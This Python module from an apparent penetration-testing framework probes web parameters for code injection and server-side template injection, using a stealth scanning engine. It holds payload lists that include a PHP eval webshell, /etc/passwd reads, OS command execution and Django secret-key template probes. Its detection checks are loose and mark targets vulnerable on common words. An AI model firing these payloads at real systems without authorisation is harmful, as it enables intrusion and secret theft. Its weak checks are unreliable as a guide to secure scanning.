"""
modules/validate/code.py
────────────────────────
Code Injection validation module.

Detects and validates code injection vulnerabilities:
  - PHP code injection (eval, include, require)
  - Python code injection (eval, exec, pickle)
  - JavaScript code injection (eval, Function)
  - Java code injection (Runtime.exec, ProcessBuilder)
  - Template injection (Jinja2, Mako, Twig, Velocity)
  - Expression language injection (EL, JSP EL)
  - Server-Side Template Injection (SSTI)

All validation requires Tier 3 confirmation (typed CONFIRM)
before any exploitation attempts.
"""

import re
import json
import urllib.parse
from typing import Any, Dict, List, Optional, Set, Tuple
from pathlib import Path

from modules.logger import get_logger, ARDFLogger
from modules.session import Session, Finding, SeverityLevel
from modules.stealth import get_stealth_engine, ScanMode


class CodeValidator:
    """
    Code injection detection and validation.
    """

    # Code injection payloads
    PAYLOADS = {
        "php": [
            "<?php echo 'test'; ?>",
            "<?php system('echo test'); ?>",
            "<?php eval($_POST['cmd']); ?>",
            "<?php phpinfo(); ?>",
            "<?php echo shell_exec('echo test'); ?>",
        ],
        "python": [
            "__import__('os').system('echo test')",
            "exec('print(\"test\")')",
            "eval('print(\"test\")')",
            "__import__('subprocess').check_output(['echo','test'])",
            "open('/etc/passwd').read()",
        ],
        "javascript": [
            "eval('alert(\"test\")')",
            "Function('alert(\"test\")')()",
            "setTimeout('alert(\"test\")',0)",
            "window['eval']('alert(\"test\")')",
            "document.write('<script>alert(\"test\")</script>')",
        ],
        "java": [
            "Runtime.getRuntime().exec('echo test')",
            "new ProcessBuilder('echo','test').start()",
            "System.out.println('test')",
            "FileInputStream('/etc/passwd')",
        ],
        "ssti_jinja2": [
            "{{ 7*7 }}",
            "{{ config }}",
            "{{ ''.__class__.__mro__[1].__subclasses__() }}",
            "{{ request.application }}",
            "{{ self.__dict__ }}",
        ],
        "ssti_twig": [
            "{{ 7*7 }}",
            "{{ _self.env.registerUndefinedFilterCallback('exec') }}",
            "{{ _self.env.getFilter('system')('echo test') }}",
        ],
        "ssti_mako": [
            "${7*7}",
            "${self.module.cache.util.os.system('echo test')}",
            "${__import__('os').system('echo test')}",
        ],
        "ssti_velocity": [
            "#set($x=7*7)",
            "#set($x=$class.forName('java.lang.Runtime').getRuntime().exec('echo test'))",
        ],
        "el": [
            "${7*7}",
            "${pageContext.request.getParameter('test')}",
            "${param.test}",
            "${header['User-Agent']}",
            "${cookie.test}",
        ],
        "ssti_flask": [
            "{{ config }}",
            "{{ self.__class__.__mro__[1].__subclasses__() }}",
            "{{ request.application.__self__.__globals__ }}",
            "{{ g }}",
            "{{ url_for.__globals__ }}",
        ],
        "ssti_django": [
            "{{ 7*7 }}",
            "{{ request }}",
            "{{ settings.SECRET_KEY }}",
            "{{ user.password }}",
            "{{ user.is_authenticated }}",
        ],
    }

    # SSTI detection patterns
    SSTI_PATTERNS = {
        "jinja2": [r"\{\{", r"\{%", r"\{\#", r"config", r"self\."],
        "twig": [r"\{\{", r"\{\%", r"_self\.", r"env\."],
        "mako": [r"\$\{", r"self\.module\.", r"__import__"],
        "velocity": [r"\$\{", r"#set", r"#if", r"#foreach"],
        "el": [r"\$\{", r"pageContext", r"param\."],
        "flask": [r"\{\{", r"config", r"request\.", r"g\."],
        "django": [r"\{\{", r"request", r"settings\.", r"user\."],
    }

    # Error patterns indicating code execution
    ERROR_PATTERNS = [
        r"eval\(\)",
        r"exec\(\)",
        r"system\(\)",
        r"shell_exec\(\)",
        r"passthru\(\)",
        r"popen\(\)",
        r"proc_open\(\)",
        r"Runtime\.exec",
        r"ProcessBuilder",
        r"__import__",
        r"__class__",
        r"__mro__",
        r"__subclasses__",
        r"__globals__",
    ]

    def __init__(self, session: Session, logger: Optional[ARDFLogger] = None):
        self.session = session
        self.logger = logger or get_logger("validate.code")
        self.out_dir = session.dir("validate") / "code"
        self.out_dir.mkdir(parents=True, exist_ok=True)
        self.stealth = get_stealth_engine(self.logger)

    def detect_code_params(self, url: str) -> List[Dict[str, Any]]:
        """
        Detect parameters that might accept code.
        """
        self.logger.info(f"Detecting code parameters: {url}")

        params = []

        # Parameters that often accept code
        code_params = [
            "code", "eval", "exec", "run", "script", "function",
            "callback", "method", "action", "command", "shell",
            "template", "view", "render", "partial", "include",
            "load", "import", "module", "plugin", "widget",
            "component", "block", "section", "content", "body",
        ]

        parsed = urllib.parse.urlparse(url)
        query = urllib.parse.parse_qs(parsed.query)

        for key in query:
            if key.lower() in code_params:
                for value in query[key]:
                    params.append({
                        "name": key,
                        "value": value,
                        "method": "GET",
                        "url": url,
                    })

        # Also check forms
        try:
            status, headers, content = self.stealth.get(url)
            if status == 200:
                for param in code_params[:10]:
                    pattern = rf'<input[^>]*name=["\']({param})["\'][^>]*>'
                    matches = re.findall(pattern, content, re.I)
                    for name in matches:
                        params.append({
                            "name": name,
                            "value": "",
                            "method": "POST",
                            "url": url,
                        })
        except Exception:
            pass

        self.logger.success(f"Found {len(params)} code parameters")
        return params

    def test_injection(self, param: Dict[str, Any]) -> Dict[str, Any]:
        """
        Test a parameter for code injection.
        """
        url = param.get("url", "")
        name = param.get("name", "")
        method = param.get("method", "GET")
        original_value = param.get("value", "")

        self.logger.info(f"Testing {method} parameter: {name}")

        results = {
            "parameter": name,
            "method": method,
            "vulnerable": False,
            "vuln_types": [],
            "payloads": [],
            "evidence": [],
        }

        # Test each payload type
        for payload_type, payloads in self.PAYLOADS.items():
            for payload in payloads[:3]:
                try:
                    test_value = original_value + payload if original_value else payload

                    if method == "GET":
                        test_url = url.replace(f"{name}={original_value}", f"{name}={urllib.parse.quote(test_value)}")
                        status, headers, content = self.stealth.get(test_url, timeout=10)
                    else:
                        data = f"{name}={urllib.parse.quote(test_value)}"
                        status, headers, content = self.stealth.post(url, data.encode(), timeout=10)

                    # Check for SSTI indicators
                    if self._check_ssti(content, payload_type):
                        results["vulnerable"] = True
                        if payload_type not in results["vuln_types"]:
                            results["vuln_types"].append(payload_type)
                        results["payloads"].append(payload[:50])
                        results["evidence"].append(content[:200])
                        self.logger.finding(f"SSTI detected: {name} -> {payload_type}", severity="critical", host=url)
                        break

                    # Check for code execution indicators
                    if self._check_code_execution(content):
                        results["vulnerable"] = True
                        if payload_type not in results["vuln_types"]:
                            results["vuln_types"].append(payload_type)
                        results["payloads"].append(payload[:50])
                        results["evidence"].append(content[:200])
                        self.logger.finding(f"Code injection detected: {name} -> {payload_type}", severity="critical", host=url)
                        break

                    self.stealth.sleep(0.5)

                except Exception as e:
                    self.logger.debug(f"Payload test failed: {e}")

        return results

    def _check_ssti(self, content: str, payload_type: str) -> bool:
        """
        Check for SSTI indicators.
        """
        content_lower = content.lower()

        # Check for template output
        ssti_outputs = ["49", "7*7", "42", "config", "self", "request"]

        for output in ssti_outputs:
            if output in content:
                return True

        # Check for SSTI patterns
        patterns = self.SSTI_PATTERNS.get(payload_type.replace("ssti_", ""), [])
        for pattern in patterns:
            if re.search(pattern, content, re.I):
                return True

        return False

    def _check_code_execution(self, content: str) -> bool:
        """
        Check for code execution indicators.
        """
        content_lower = content.lower()

        for pattern in self.ERROR_PATTERNS:
            if re.search(pattern, content_lower, re.I):
                return True

        # Check for common code output
        code_outputs = ["test", "executed", "eval", "system"]
        for output in code_outputs:
            if output in content_lower:
                return True

        return False

    def confirm_vulnerability(self, param: Dict[str, Any], payload: str) -> bool:
        """
        Confirm code injection with a safe test.
        """
        self.logger.info(f"Confirming code injection on {param['name']}")

        url = param.get("url", "")
        name = param.get("name", "")
        original_value = param.get("value", "")

        # Use a safe test that returns a unique string
        test_payloads = [
            "{{ 7*7 }}",
            "${7*7}",
            "<?php echo 'CODE_INJECTION_TEST'; ?>",
            "__import__('os').system('echo CODE_INJECTION_TEST')",
            "eval('\"CODE_INJECTION_TEST\"')",
        ]

        for test_payload in test_payloads:
            try:
                test_value = original_value + test_payload if original_value else test_payload
                test_url = url.replace(f"{name}={original_value}", f"{name}={urllib.parse.quote(test_value)}")
                status, headers, content = self.stealth.get(test_url, timeout=10)

                if "CODE_INJECTION_TEST" in content or "49" in content:
                    self.logger.finding(f"Code injection confirmed: {param['name']}", severity="critical", host=url)
                    return True

                self.stealth.sleep(0.5)

            except Exception:
                pass

        return False

    def validate(self, url: str) -> Dict[str, Any]:
        """
        Full code injection validation workflow.
        """
        self.logger.info(f"Code injection validation: {url}")

        results = {
            "url": url,
            "parameters": [],
            "vulnerable": [],
            "confirmed": [],
            "status": "completed"
        }

        # Detect code parameters
        params = self.detect_code_params(url)
        results["parameters"] = params

        # Test each parameter
        for param in params:
            test_result = self.test_injection(param)
            if test_result["vulnerable"]:
                results["vulnerable"].append(test_result)

                # Confirm with a safe test
                if self.confirm_vulnerability(param, "{{ 7*7 }}"):
                    results["confirmed"].append({
                        "parameter": param["name"],
                        "method": param["method"],
                        "url": param["url"],
                        "vuln_types": test_result["vuln_types"],
                    })

                    self.session.add_finding(Finding(
                        source="validate.code",
                        title=f"Code injection confirmed: {param['name']}",
                        description=f"Types: {', '.join(test_result['vuln_types'])}",
                        severity=SeverityLevel.CRITICAL,
                        host=url,
                        tags=["code-injection", "ssti", "validated"],
                        evidence=json.dumps(test_result["evidence"][:3]),
                        remediation="Avoid eval, exec, and system calls. Use safe template engines.",
                    ))

        return results

    def run(self, target: str) -> Dict[str, Any]:
        """
        Run code injection validation on target.
        """
        self.logger.banner(f"CODE INJECTION VALIDATION: {target}", style="bold red")

        self.stealth.config.scan_mode = ScanMode.LOW

        urls = [
            f"https://{target}",
            f"http://{target}",
        ]

        results = {
            "target": target,
            "urls_tested": [],
            "vulnerabilities": [],
            "confirmed": []
        }

        for url in urls:
            try:
                result = self.validate(url)
                results["urls_tested"].append(url)
                results["vulnerabilities"].extend(result["vulnerable"])
                results["confirmed"].extend(result["confirmed"])
            except Exception as e:
                self.logger.warning(f"Validation failed for {url}: {e}")

        # Save results
        report_path = self.out_dir / f"code_report_{_safe(target)}.json"
        report_path.write_text(json.dumps(results, indent=2, default=str))

        self.logger.success(f"Code injection validation: {len(results['confirmed'])} confirmed")
        return results


def _safe(s: str) -> str:
    return re.sub(r"[^\w.-]", "_", s)[:50]